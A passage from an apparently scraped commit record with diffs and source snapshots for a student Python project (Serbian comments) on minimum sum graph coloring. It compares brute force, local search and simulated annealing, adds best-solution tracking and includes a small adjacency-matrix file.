calc_solution_value(graph):\n-\n-#   stari deo-- radi ali nije potreban\n-    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n-    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n-    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n-    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n-\n-    tmp = list(map(lambda el: (el,1),graph.coloring_vector))\n-    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n-    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n-\n-    total_sum = 0\n-    for index,tupp in enumerate(tmp):\n-        total_sum += (index+1)*tupp[1]\n-\n-    return total_sum\n \n def free_colors(zauzete, ind, n):\n     slobodne = []\n@@ -54,7 +35,7 @@ def calc_solution_value(solution, graph):\n \n     # print(x_boje)\n     # print(sum(x_boje))\n-    return sum(x_boje)\n+    return sum(x_boje), x_boje\n \n def initialize(num_resources):\n     #generisemo permutacije\n@@ -80,7 +61,10 @@ def draw_graph(xs, ys):\n def local_search(graph, max_iters):\n     #initialize solution\n     solution = initialize(graph.num_of_vertices)\n-    curr_value = calc_solution_value(solution, graph)\n+    curr_value,_ = calc_solution_value(solution, graph)\n+\n+    best_solution = deepcopy(solution)\n+    best_value = curr_value\n \n     # za iscrtavanje grafika\n     xs = []\n@@ -89,10 +73,13 @@ def local_search(graph, max_iters):\n     for i in range(max_iters):\n         #malo promenimo resenje\n         new_solution = make_small_change(solution)\n-        new_value = calc_solution_value(new_solution,graph)\n+        new_value,_ = calc_solution_value(new_solution,graph)\n         if new_value < curr_value:\n             solution = deepcopy(new_solution)\n             curr_value = new_value\n+            if new_value < best_value:\n+                best_value = new_value\n+                best_solution = deepcopy(new_solution)\n         else:\n             #nastavi sa starim resenjem\n             pass\n@@ -102,7 +89,7 @@ def local_search(graph, max_iters):\n \n     draw_graph(xs,ys)\n \n-    return solution,curr_value\n+    return best_solution,best_value\n \n if __name__=='__main__':\n \n@@ -114,4 +101,6 @@ def local_search(graph, max_iters):\n \n     solution, curr_value = local_search(g,10000)\n     print(solution)\n-    print(curr_value)\n\\ No newline at end of file\n+    print(curr_value)\n+    suma,_ = calc_solution_value(solution,g)\n+    print(suma)\n\\ No newline at end of file\ndiff --git a\/main.py b\/main.py\nindex 2b15902..9f5d5f3 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -1,20 +1,29 @@\n from simulated_annealing_msc import simulated_annealing\n from local_search_mcs import local_search\n+from brute_force_msc import brute_force\n+from local_search_mcs import calc_solution_value\n from graph import Graph\n \n if __name__ == '__main__':\n     g = Graph()\n-    g.load_graph_from_file(\"random_graph.txt\")\n+    g.load_graph_from_file(\"small_random_graph.txt\")\n     # print(g)\n     max_iters = 10000\n \n+    #Brute force algorithm\n+    print(\"Brute force results: \")\n+    brute_force(g)\n \n+    #Local search algorithm\n     solution, curr_value = local_search(g, max_iters)\n     print(\"Local search results: \")\n-    print(solution)\n+    _,colors_vector = calc_solution_value(solution,g)\n+    print(colors_vector)\n     print(curr_value)\n \n+    #Simulated annealing algorithm\n     solution, curr_value = simulated_annealing(g, max_iters)\n     print(\"Simulated_annealing results: \")\n-    print(solution)\n+    _, colors_vector = calc_solution_value(solution, g)\n+    print(colors_vector)\n     print(curr_value)\n\\ No newline at end of file\ndiff --git a\/simulated_annealing_msc.py b\/simulated_annealing_msc.py\nindex a202ef3..ccd4d41 100644\n--- a\/simulated_annealing_msc.py\n+++ b\/simulated_annealing_msc.py\n@@ -34,7 +34,7 @@ def calc_solution_value(solution, graph):\n \n     # print(x_boje)\n     # print(sum(x_boje))\n-    return sum(x_boje)\n+    return sum(x_boje), x_boje\n \n def initialize(num_resources):\n     #generisemo permutacije\n@@ -60,7 +60,7 @@ def draw_graph(xs, ys):\n def simulated_annealing(graph, max_iters):\n     #initialize solution\n     solution = initialize(graph.num_of_vertices)\n-    curr_value = calc_solution_value(solution, graph)\n+    curr_value,_ = calc_solution_value(solution, graph)\n \n     best_solution = deepcopy(solution)\n     best_value = curr_value\n@@ -72,7 +72,7 @@ def simulated_annealing(graph, max_iters):\n     for i in range(1,max_iters+1):\n         #malo promenimo resenje\n         new_solution = make_small_change(solution)\n-        new_value = calc_solution_value(new_solution,graph)\n+        new_value,_ = calc_solution_value(new_solution,graph)\n         if new_value < curr_value:\n             solution = deepcopy(new_solution)\n             curr_value = new_value\n@@ -102,6 +102,8 @@ def simulated_annealing(graph, max_iters):\n     g.load_graph_from_file(\"random_graph.txt\")\n     # print(g)\n \n-    solution, curr_value = simulated_annealing(g,10000)\n+    solution, curr_value = simulated_annealing(g, 10000)\n     print(solution)\n-    print(curr_value)\n\\ No newline at end of file\n+    print(curr_value)\n+    suma, _ = calc_solution_value(solution, g)\n+    print(suma)\n\\ No newline at end of file\ndiff --git a\/small_random_graph.txt b\/small_random_graph.txt\nnew file mode 100644\nindex 0000000..9d72329\n--- \/dev\/null\n+++ b\/small_random_graph.txt\n@@ -0,0 +1,17 @@\n+16\n+0 0 1 1 1 1 0 0 1 1 1 1 0 1 1 1\n+0 0 1 0 1 1 1 1 1 0 0 1 0 1 1 0\n+1 1 0 0 1 1 1 1 1 0 1 1 1 0 1 0\n+1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1\n+1 1 1 0 0 1 1 1 1 1 1 1 1 0 1 1\n+1 1 1 1 1 0 1 1 0 1 1 0 1 1 1 0\n+0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1\n+0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1\n+1 1 1 1 1 0 1 1 0 1 1 1 1 1 1 0\n+1 0 0 1 1 1 1 1 1 0 1 1 1 1 0 1\n+1 0 1 1 1 1 1 1 1 1 0 1 0 0 0 1\n+1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 0\n+0 0 1 1 1 1 1 1 1 1 0 1 0 0 1 0\n+1 1 0 1 0 1 1 1 1 1 0 1 0 0 1 0\n+1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 0\n+1 0 0 1 1 0 1 1 0 1 1 0 0 0 0 0\n","message":"","files":{"\/Brute-Force MCS (1).py":{"changes":[{"diff":"\n-import random\n-import numpy as np\n-class Graph():\n-  \n-    def __init__(self, vertices):\n-        self.V = vertices\n-        self.graph = [[0 for column in range(vertices)]\n-                      for row in range(vertices)]\n-  \n-    #proveravamo da li mozemo na taj nacin da obojimo graf\n-    def isSafe(self, v, colour, c):\n-        for i in range(self.V):\n-            if self.graph[v][i] == 1 and colour[i] == c:\n-                return False\n-        return True\n-  \n-    #proveravamo da li mozemo sa m boja da obojimo graf\n-    \n-    def graphColourUtil(self, m, colour, v):\n-        if v == self.V:\n-            return True\n-        #krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n-        for c in range(1, m + 1):\n-            if self.isSafe(v, colour, c) == True:\n-                colour[v] = c\n-                #kada obojimo taj cvor pozivamo rekurzivno za naredni\n-                if self.graphColourUtil(m, colour, v + 1) == True:\n-                    return True\n-                colour[v] = 0\n-  \n-    #bojimo graf\n-    def graphColouring(self, m):\n-        colour = [0] * self.V\n-        if self.graphColourUtil(m, colour, 0) == None:\n-            return False, 0,colour\n-  \n-       \n-        return True , max(colour),colour\n-    \n-    #numerisemo random graf\n-    \n-    def randomGraph(self, numvertices):\n-        n=numvertices\n-        adjacency_matrix = np.random.randint(0,2,(n,n))\n-        for i in range(n):\n-            for j in range(n):\n-                if adjacency_matrix[i][j] == 1:\n-                    adjacency_matrix[j][i] =1\n-            adjacency_matrix[i][i]=0\n-            \n-        print(adjacency_matrix)\n-        return  adjacency_matrix\n-        \n-        \n-  \n-  \n-# Driver Code\n-if __name__ == '__main__':\n-\n-    numvertices= random.randrange(3,15)\n-    g = Graph(numvertices)\n-    #g= Graph(5)\n-    minsuma = 9999999999999\n-    \n-    suma =0\n-    print(\"number of enges\")\n-    print(numvertices)\n-    g.graph = g.randomGraph(numvertices)\n-    true, num, colour =g.graphColouring(numvertices)\n-    for c in colour:\n-        suma= suma +c\n-    \n-    if suma <minsuma:\n-        minsuma = suma\n-        \n-        \n-    print('prva suma koju nadje  je: ',minsuma)\n-    if true == False:\n-        print(\"solution not exist\")\n-    \n-    elif true == True:\n-        for i in range(num-1):\n-            suma =0\n-            stop, newnum, colour1 =g.graphColouring(num-i-1)\n-            \n-            if stop == True:\n-                for c in colour1:\n-                    suma= suma +c\n-                \n-                if suma <minsuma:\n-                    minsuma = suma\n-                colour=colour1\n-                continue\n-            elif stop == False:\n-                print(\"Solution exist and Following are the assigned colours:\")\n-                for c in colour:\n-                    print(c,end=' ')\n-                print()\n-                print('minimumna suma je: ' , minsuma)\n-                print('min num of colour are ',max(colour))\n-                break\n-   \n-  \n-    \n-\n-\n-","add":0,"remove":107,"filename":"\/Brute-Force MCS (1).py","badparts":["import random","import numpy as np","class Graph():","    def __init__(self, vertices):","        self.V = vertices","        self.graph = [[0 for column in range(vertices)]","                      for row in range(vertices)]","    def isSafe(self, v, colour, c):","        for i in range(self.V):","            if self.graph[v][i] == 1 and colour[i] == c:","                return False","        return True","    def graphColourUtil(self, m, colour, v):","        if v == self.V:","            return True","        for c in range(1, m + 1):","            if self.isSafe(v, colour, c) == True:","                colour[v] = c","                if self.graphColourUtil(m, colour, v + 1) == True:","                    return True","                colour[v] = 0","    def graphColouring(self, m):","        colour = [0] * self.V","        if self.graphColourUtil(m, colour, 0) == None:","            return False, 0,colour","        return True , max(colour),colour","    def randomGraph(self, numvertices):","        n=numvertices","        adjacency_matrix = np.random.randint(0,2,(n,n))","        for i in range(n):","            for j in range(n):","                if adjacency_matrix[i][j] == 1:","                    adjacency_matrix[j][i] =1","            adjacency_matrix[i][i]=0","        print(adjacency_matrix)","        return  adjacency_matrix","if __name__ == '__main__':","    numvertices= random.randrange(3,15)","    g = Graph(numvertices)","    minsuma = 9999999999999","    suma =0","    print(\"number of enges\")","    print(numvertices)","    g.graph = g.randomGraph(numvertices)","    true, num, colour =g.graphColouring(numvertices)","    for c in colour:","        suma= suma +c","    if suma <minsuma:","        minsuma = suma","    print('prva suma koju nadje  je: ',minsuma)","    if true == False:","        print(\"solution not exist\")","    elif true == True:","        for i in range(num-1):","            suma =0","            stop, newnum, colour1 =g.graphColouring(num-i-1)","            if stop == True:","                for c in colour1:","                    suma= suma +c","                if suma <minsuma:","                    minsuma = suma","                colour=colour1","                continue","            elif stop == False:","                print(\"Solution exist and Following are the assigned colours:\")","                for c in colour:","                    print(c,end=' ')","                print()","                print('minimumna suma je: ' , minsuma)","                print('min num of colour are ',max(colour))","                break"],"goodparts":[]}],"source":"\nimport random import numpy as np class Graph(): def __init__(self, vertices): self.V=vertices self.graph=[[0 for column in range(vertices)] for row in range(vertices)] def isSafe(self, v, colour, c): for i in range(self.V): if self.graph[v][i]==1 and colour[i]==c: return False return True def graphColourUtil(self, m, colour, v): if v==self.V: return True for c in range(1, m +1): if self.isSafe(v, colour, c)==True: colour[v]=c if self.graphColourUtil(m, colour, v +1)==True: return True colour[v]=0 def graphColouring(self, m): colour=[0] * self.V if self.graphColourUtil(m, colour, 0)==None: return False, 0,colour return True, max(colour),colour def randomGraph(self, numvertices): n=numvertices adjacency_matrix=np.random.randint(0,2,(n,n)) for i in range(n): for j in range(n): if adjacency_matrix[i][j]==1: adjacency_matrix[j][i]=1 adjacency_matrix[i][i]=0 print(adjacency_matrix) return adjacency_matrix if __name__=='__main__': numvertices=random.randrange(3,15) g=Graph(numvertices) minsuma=9999999999999 suma=0 print(\"number of enges\") print(numvertices) g.graph=g.randomGraph(numvertices) true, num, colour=g.graphColouring(numvertices) for c in colour: suma=suma +c if suma <minsuma: minsuma=suma print('prva suma koju nadje je: ',minsuma) if true==False: print(\"solution not exist\") elif true==True: for i in range(num-1): suma=0 stop, newnum, colour1=g.graphColouring(num-i-1) if stop==True: for c in colour1: suma=suma +c if suma <minsuma: minsuma=suma colour=colour1 continue elif stop==False: print(\"Solution exist and Following are the assigned colours:\") for c in colour: print(c,end=' ') print() print('minimumna suma je: ', minsuma) print('min num of colour are ',max(colour)) break ","sourceWithComments":"import random\nimport numpy as np\nclass Graph():\n  \n    def __init__(self, vertices):\n        self.V = vertices\n        self.graph = [[0 for column in range(vertices)]\n                      for row in range(vertices)]\n  \n    #proveravamo da li mozemo na taj nacin da obojimo graf\n    def isSafe(self, v, colour, c):\n        for i in range(self.V):\n            if self.graph[v][i] == 1 and colour[i] == c:\n                return False\n        return True\n  \n    #proveravamo da li mozemo sa m boja da obojimo graf\n    \n    def graphColourUtil(self, m, colour, v):\n        if v == self.V:\n            return True\n        #krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n        for c in range(1, m + 1):\n            if self.isSafe(v, colour, c) == True:\n                colour[v] = c\n                #kada obojimo taj cvor pozivamo rekurzivno za naredni\n                if self.graphColourUtil(m, colour, v + 1) == True:\n                    return True\n                colour[v] = 0\n  \n    #bojimo graf\n    def graphColouring(self, m):\n        colour = [0] * self.V\n        if self.graphColourUtil(m, colour, 0) == None:\n            return False, 0,colour\n  \n       \n        return True , max(colour),colour\n    \n    #numerisemo random graf\n    \n    def randomGraph(self, numvertices):\n        n=numvertices\n        adjacency_matrix = np.random.randint(0,2,(n,n))\n        for i in range(n):\n            for j in range(n):\n                if adjacency_matrix[i][j] == 1:\n                    adjacency_matrix[j][i] =1\n            adjacency_matrix[i][i]=0\n            \n        print(adjacency_matrix)\n        return  adjacency_matrix\n        \n        \n  \n  \n# Driver Code\nif __name__ == '__main__':\n\n    numvertices= random.randrange(3,15)\n    g = Graph(numvertices)\n    #g= Graph(5)\n    minsuma = 9999999999999\n    \n    suma =0\n    print(\"number of enges\")\n    print(numvertices)\n    g.graph = g.randomGraph(numvertices)\n    true, num, colour =g.graphColouring(numvertices)\n    for c in colour:\n        suma= suma +c\n    \n    if suma <minsuma:\n        minsuma = suma\n        \n        \n    print('prva suma koju nadje  je: ',minsuma)\n    if true == False:\n        print(\"solution not exist\")\n    \n    elif true == True:\n        for i in range(num-1):\n            suma =0\n            stop, newnum, colour1 =g.graphColouring(num-i-1)\n            \n            if stop == True:\n                for c in colour1:\n                    suma= suma +c\n                \n                if suma <minsuma:\n                    minsuma = suma\n                colour=colour1\n                continue\n            elif stop == False:\n                print(\"Solution exist and Following are the assigned colours:\")\n                for c in colour:\n                    print(c,end=' ')\n                print()\n                print('minimumna suma je: ' , minsuma)\n                print('min num of colour are ',max(colour))\n                break\n   \n  \n    \n\n\n\n"},"\/graph.py":{"changes":[{"diff":"\n \n     def __init__(self,num_of_vertices=10):\n         self.num_of_vertices = num_of_vertices\n-        self.adjacency_matrix = np.array([[0 for _ in range(num_of_vertices)] for _ in range(num_of_vertices)])\n+        self.adjacency_matrix = np.array([[0 for column in range(num_of_vertices)]\n+                                          for rows in range(num_of_vertices)])\n \n     #neusmeren graf\n     def add_edge(self, u, v):\n","add":2,"remove":1,"filename":"\/graph.py","badparts":["        self.adjacency_matrix = np.array([[0 for _ in range(num_of_vertices)] for _ in range(num_of_vertices)])"],"goodparts":["        self.adjacency_matrix = np.array([[0 for column in range(num_of_vertices)]","                                          for rows in range(num_of_vertices)])"]}],"source":"\nimport numpy as np class Graph(): def __init__(self,num_of_vertices=10): self.num_of_vertices=num_of_vertices self.adjacency_matrix=np.array([[0 for _ in range(num_of_vertices)] for _ in range(num_of_vertices)]) def add_edge(self, u, v): self.adjacency_matrix[u][v]=1 self.adjacency_matrix[v][u]=1 def random_graph(self): n=self.num_of_vertices self.adjacency_matrix=np.random.randint(0,2,(n,n)) for i in range(n): for j in range(n): if self.adjacency_matrix[i][j]==1: self.adjacency_matrix[j][i]=1 if i==j: self.adjacency_matrix[i][j]=0 def get_edges(self,i,j): return self.adjacency_matrix[i][j] def __str__(self): return 'Num of vertices: \\n' +str(self.num_of_vertices) +'\\n' +\"Adjacency_matrix: \\n\" +str(self.adjacency_matrix) def load_graph_from_file(self,filename): self.adjacency_matrix=np.ndarray([]) with open(filename,\"r\") as f: self.num_of_vertices=int(f.readline()) self.adjacency_matrix=np.loadtxt(f) def save_graph_to_file(self,filename): with open(filename, \"w\") as f: f.write(str(self.num_of_vertices)) f.write('\\n') np.savetxt(f, self.adjacency_matrix, fmt='%d') ","sourceWithComments":"import numpy as np\nclass Graph():\n\n    def __init__(self,num_of_vertices=10):\n        self.num_of_vertices = num_of_vertices\n        self.adjacency_matrix = np.array([[0 for _ in range(num_of_vertices)] for _ in range(num_of_vertices)])\n\n    #neusmeren graf\n    def add_edge(self, u, v):\n        self.adjacency_matrix[u][v] = 1\n        self.adjacency_matrix[v][u] = 1\n\n    #ispis random grafa\n    def random_graph(self):\n        n = self.num_of_vertices\n        self.adjacency_matrix = np.random.randint(0,2,(n,n))\n        for i in range(n):\n            for j in range(n):\n                if self.adjacency_matrix[i][j] == 1:\n                    self.adjacency_matrix[j][i] = 1\n\n                #na dijagonali ne zelimo jedinice\n                if i == j:\n                    self.adjacency_matrix[i][j]=0\n\n    def get_edges(self,i,j):\n        return self.adjacency_matrix[i][j]\n    def __str__(self):\n       return 'Num of vertices: \\n' + str(self.num_of_vertices) + '\\n' + \"Adjacency_matrix: \\n\" + str(self.adjacency_matrix)\n\n    def load_graph_from_file(self,filename):\n        self.adjacency_matrix = np.ndarray([])\n        with open(filename,\"r\") as f:\n            self.num_of_vertices = int(f.readline())\n            self.adjacency_matrix = np.loadtxt(f)\n\n\n    def save_graph_to_file(self,filename):\n        with open(filename, \"w\") as f:\n            f.write(str(self.num_of_vertices))\n            f.write('\\n')\n            np.savetxt(f, self.adjacency_matrix, fmt='%d')\n"},"\/local_search_mcs.py":{"changes":[{"diff":"\n \n from copy import deepcopy\n from matplotlib import pyplot as plt\n-from collections import Counter\n from graph import Graph\n \n-#stari calc_solution trebace\n-def calc_solution_value(graph):\n-\n-#   stari deo-- radi ali nije potreban\n-    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n-    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n-    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n-    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n-\n-    tmp = list(map(lambda el: (el,1),graph.coloring_vector))\n-    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n-    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n-\n-    total_sum = 0\n-    for index,tupp in enumerate(tmp):\n-        total_sum += (index+1)*tupp[1]\n-\n-    return total_sum\n \n def free_colors(zauzete, ind, n):\n     slobodne = []\n","add":0,"remove":19,"filename":"\/local_search_mcs.py","badparts":["from collections import Counter","def calc_solution_value(graph):","    tmp = list(map(lambda el: (el,1),graph.coloring_vector))","    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))","    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)","    total_sum = 0","    for index,tupp in enumerate(tmp):","        total_sum += (index+1)*tupp[1]","    return total_sum"],"goodparts":[]},{"diff":"\n \n     # print(x_boje)\n     # print(sum(x_boje))\n-    return sum(x_boje)\n+    return sum(x_boje), x_boje\n \n def initialize(num_resources):\n     #generisemo permutacije\n","add":1,"remove":1,"filename":"\/local_search_mcs.py","badparts":["    return sum(x_boje)"],"goodparts":["    return sum(x_boje), x_boje"]},{"diff":"\n def local_search(graph, max_iters):\n     #initialize solution\n     solution = initialize(graph.num_of_vertices)\n-    curr_value = calc_solution_value(solution, graph)\n+    curr_value,_ = calc_solution_value(solution, graph)\n+\n+    best_solution = deepcopy(solution)\n+    best_value = curr_value\n \n     # za iscrtavanje grafika\n     xs = []\n","add":4,"remove":1,"filename":"\/local_search_mcs.py","badparts":["    curr_value = calc_solution_value(solution, graph)"],"goodparts":["    curr_value,_ = calc_solution_value(solution, graph)","    best_solution = deepcopy(solution)","    best_value = curr_value"]},{"diff":"\n     for i in range(max_iters):\n         #malo promenimo resenje\n         new_solution = make_small_change(solution)\n-        new_value = calc_solution_value(new_solution,graph)\n+        new_value,_ = calc_solution_value(new_solution,graph)\n         if new_value < curr_value:\n             solution = deepcopy(new_solution)\n             curr_value = new_value\n+            if new_value < best_value:\n+                best_value = new_value\n+                best_solution = deepcopy(new_solution)\n         else:\n             #nastavi sa starim resenjem\n             pass\n","add":4,"remove":1,"filename":"\/local_search_mcs.py","badparts":["        new_value = calc_solution_value(new_solution,graph)"],"goodparts":["        new_value,_ = calc_solution_value(new_solution,graph)","            if new_value < best_value:","                best_value = new_value","                best_solution = deepcopy(new_solution)"]},{"diff":"\n \n     draw_graph(xs,ys)\n \n-    return solution,curr_value\n+    return best_solution,best_value\n \n if __name__=='__main__':\n \n","add":1,"remove":1,"filename":"\/local_search_mcs.py","badparts":["    return solution,curr_value"],"goodparts":["    return best_solution,best_value"]},{"diff":"\n \n     solution, curr_value = local_search(g,10000)\n     print(solution)\n-    print(curr_value)\n\\ No newline at end of file\n+    print(curr_value)\n+    suma,_ = calc_solution_value(solution,g)\n+    print(suma)\n\\ No newline at end ","add":3,"remove":1,"filename":"\/local_search_mcs.py","badparts":["    print(curr_value)"],"goodparts":["    print(curr_value)","    suma,_ = calc_solution_value(solution,g)","    print(suma)"]}],"source":"\n\nimport random import numpy as np from copy import deepcopy from matplotlib import pyplot as plt from collections import Counter from graph import Graph def calc_solution_value(graph): tmp=list(map(lambda el:(el,1),graph.coloring_vector)) tmp=list(set([(el[0], Counter(tmp)[el]) for el in tmp])) tmp=sorted(tmp, key=lambda el: el[1],reverse=True) total_sum=0 for index,tupp in enumerate(tmp): total_sum +=(index+1)*tupp[1] return total_sum def free_colors(zauzete, ind, n): slobodne=[] for i in range(1,n+1): if i not in zauzete[ind]: slobodne.append(i) return slobodne def calc_solution_value(solution, graph): n=graph.num_of_vertices x_boje=[0 for _ in range(n)] zauzete=[[] for _ in range(n)] for i in range(len(solution)): ind=solution.index(i) if i==0: x_boje[ind]=1 for j in range(n): if graph.get_edges(ind,j)==1: zauzete[j].append(1) else: slobodne=free_colors(zauzete,ind,n) x_boje[ind]=min(slobodne) for j in range(n): if graph.get_edges(ind,j)==1: zauzete[j].append(x_boje[ind]) return sum(x_boje) def initialize(num_resources): solution=list(np.random.permutation(num_resources)) return solution def make_small_change(solution): poz1=random.randrange(0, len(solution)) poz2=random.randrange(0, len(solution)) pom=solution[poz1] solution[poz1]=solution[poz2] solution[poz2]=pom return solution def draw_graph(xs, ys): plt.title('Solution value through the iterations: ') plt.xlabel('Iters') plt.ylabel('Target function') plt.plot(xs, ys, color='blue') plt.show() def local_search(graph, max_iters): solution=initialize(graph.num_of_vertices) curr_value=calc_solution_value(solution, graph) xs=[] ys=[] for i in range(max_iters): new_solution=make_small_change(solution) new_value=calc_solution_value(new_solution,graph) if new_value < curr_value: solution=deepcopy(new_solution) curr_value=new_value else: pass xs.append(i) ys.append(curr_value) draw_graph(xs,ys) return solution,curr_value if __name__=='__main__': g=Graph(30) g.random_graph() g.load_graph_from_file(\"random_graph.txt\") solution, curr_value=local_search(g,10000) print(solution) print(curr_value) ","sourceWithComments":"#!\/usr\/bin\/python3\nimport random\nimport numpy as np\n\nfrom copy import deepcopy\nfrom matplotlib import pyplot as plt\nfrom collections import Counter\nfrom graph import Graph\n\n#stari calc_solution trebace\ndef calc_solution_value(graph):\n\n#   stari deo-- radi ali nije potreban\n    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n\n    tmp = list(map(lambda el: (el,1),graph.coloring_vector))\n    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n\n    total_sum = 0\n    for index,tupp in enumerate(tmp):\n        total_sum += (index+1)*tupp[1]\n\n    return total_sum\n\ndef free_colors(zauzete, ind, n):\n    slobodne = []\n    for i in range(1,n+1):\n        if i not in zauzete[ind]:\n            slobodne.append(i)\n    return slobodne\n\ndef calc_solution_value(solution, graph):\n    n = graph.num_of_vertices\n    x_boje = [0 for _ in range(n)]\n    zauzete = [[] for _ in range(n)]\n\n    for i in range(len(solution)):\n        ind = solution.index(i)\n        if i == 0:\n            x_boje[ind] = 1\n            for j in range(n):\n                if graph.get_edges(ind,j) == 1:\n                    zauzete[j].append(1)\n        else:\n            slobodne = free_colors(zauzete,ind,n)\n            x_boje[ind] = min(slobodne)\n            for j in range(n):\n                if graph.get_edges(ind,j) == 1:\n                    zauzete[j].append(x_boje[ind])\n\n    # print(x_boje)\n    # print(sum(x_boje))\n    return sum(x_boje)\n\ndef initialize(num_resources):\n    #generisemo permutacije\n    solution = list(np.random.permutation(num_resources))\n    return solution\n\ndef make_small_change(solution):\n    poz1 = random.randrange(0, len(solution))\n    poz2 = random.randrange(0, len(solution))\n    pom = solution[poz1]\n    solution[poz1] = solution[poz2]\n    solution[poz2] = pom\n\n    return solution\ndef draw_graph(xs, ys):\n    # iscrtavnanje grafika\n    plt.title('Solution value through the iterations: ')\n    plt.xlabel('Iters')\n    plt.ylabel('Target function')\n    plt.plot(xs, ys, color='blue')\n    plt.show()\n\ndef local_search(graph, max_iters):\n    #initialize solution\n    solution = initialize(graph.num_of_vertices)\n    curr_value = calc_solution_value(solution, graph)\n\n    # za iscrtavanje grafika\n    xs = []\n    ys = []\n\n    for i in range(max_iters):\n        #malo promenimo resenje\n        new_solution = make_small_change(solution)\n        new_value = calc_solution_value(new_solution,graph)\n        if new_value < curr_value:\n            solution = deepcopy(new_solution)\n            curr_value = new_value\n        else:\n            #nastavi sa starim resenjem\n            pass\n\n        xs.append(i)\n        ys.append(curr_value)\n\n    draw_graph(xs,ys)\n\n    return solution,curr_value\n\nif __name__=='__main__':\n\n    g = Graph(30)\n    g.random_graph()\n    # g.save_graph_to_file(\"random_graph.txt\")\n    g.load_graph_from_file(\"random_graph.txt\")\n    # print(g)\n\n    solution, curr_value = local_search(g,10000)\n    print(solution)\n    print(curr_value)"},"\/main.py":{"changes":[{"diff":"\n from simulated_annealing_msc import simulated_annealing\n from local_search_mcs import local_search\n+from brute_force_msc import brute_force\n+from local_search_mcs import calc_solution_value\n from graph import Graph\n \n if __name__ == '__main__':\n     g = Graph()\n-    g.load_graph_from_file(\"random_graph.txt\")\n+    g.load_graph_from_file(\"small_random_graph.txt\")\n     # print(g)\n     max_iters = 10000\n \n+    #Brute force algorithm\n+    print(\"Brute force results: \")\n+    brute_force(g)\n \n+    #Local search algorithm\n     solution, curr_value = local_search(g, max_iters)\n     print(\"Local search results: \")\n-    print(solution)\n+    _,colors_vector = calc_solution_value(solution,g)\n+    print(colors_vector)\n     print(curr_value)\n \n+    #Simulated annealing algorithm\n     solution, curr_value = simulated_annealing(g, max_iters)\n     print(\"Simulated_annealing results: \")\n-    print(solution)\n+    _, colors_vector = calc_solution_value(solution, g)\n+    print(colors_vector)\n     print(curr_value)\n\\ No newline at end","add":12,"remove":3,"filename":"\/main.py","badparts":["    g.load_graph_from_file(\"random_graph.txt\")","    print(solution)","    print(solution)"],"goodparts":["from brute_force_msc import brute_force","from local_search_mcs import calc_solution_value","    g.load_graph_from_file(\"small_random_graph.txt\")","    print(\"Brute force results: \")","    brute_force(g)","    _,colors_vector = calc_solution_value(solution,g)","    print(colors_vector)","    _, colors_vector = calc_solution_value(solution, g)","    print(colors_vector)"]}],"source":"\nfrom simulated_annealing_msc import simulated_annealing from local_search_mcs import local_search from graph import Graph if __name__=='__main__': g=Graph() g.load_graph_from_file(\"random_graph.txt\") max_iters=10000 solution, curr_value=local_search(g, max_iters) print(\"Local search results: \") print(solution) print(curr_value) solution, curr_value=simulated_annealing(g, max_iters) print(\"Simulated_annealing results: \") print(solution) print(curr_value) ","sourceWithComments":"from simulated_annealing_msc import simulated_annealing\nfrom local_search_mcs import local_search\nfrom graph import Graph\n\nif __name__ == '__main__':\n    g = Graph()\n    g.load_graph_from_file(\"random_graph.txt\")\n    # print(g)\n    max_iters = 10000\n\n\n    solution, curr_value = local_search(g, max_iters)\n    print(\"Local search results: \")\n    print(solution)\n    print(curr_value)\n\n    solution, curr_value = simulated_annealing(g, max_iters)\n    print(\"Simulated_annealing results: \")\n    print(solution)\n    print(curr_value)"},"\/simulated_annealing_msc.py":{"changes":[{"diff":"\n \n     # print(x_boje)\n     # print(sum(x_boje))\n-    return sum(x_boje)\n+    return sum(x_boje), x_boje\n \n def initialize(num_resources):\n     #generisemo permutacije\n","add":1,"remove":1,"filename":"\/simulated_annealing_msc.py","badparts":["    return sum(x_boje)"],"goodparts":["    return sum(x_boje), x_boje"]},{"diff":"\n def simulated_annealing(graph, max_iters):\n     #initialize solution\n     solution = initialize(graph.num_of_vertices)\n-    curr_value = calc_solution_value(solution, graph)\n+    curr_value,_ = calc_solution_value(solution, graph)\n \n     best_solution = deepcopy(solution)\n     best_value = curr_value\n","add":1,"remove":1,"filename":"\/simulated_annealing_msc.py","badparts":["    curr_value = calc_solution_value(solution, graph)"],"goodparts":["    curr_value,_ = calc_solution_value(solution, graph)"]},{"diff":"\n     for i in range(1,max_iters+1):\n         #malo promenimo resenje\n         new_solution = make_small_change(solution)\n-        new_value = 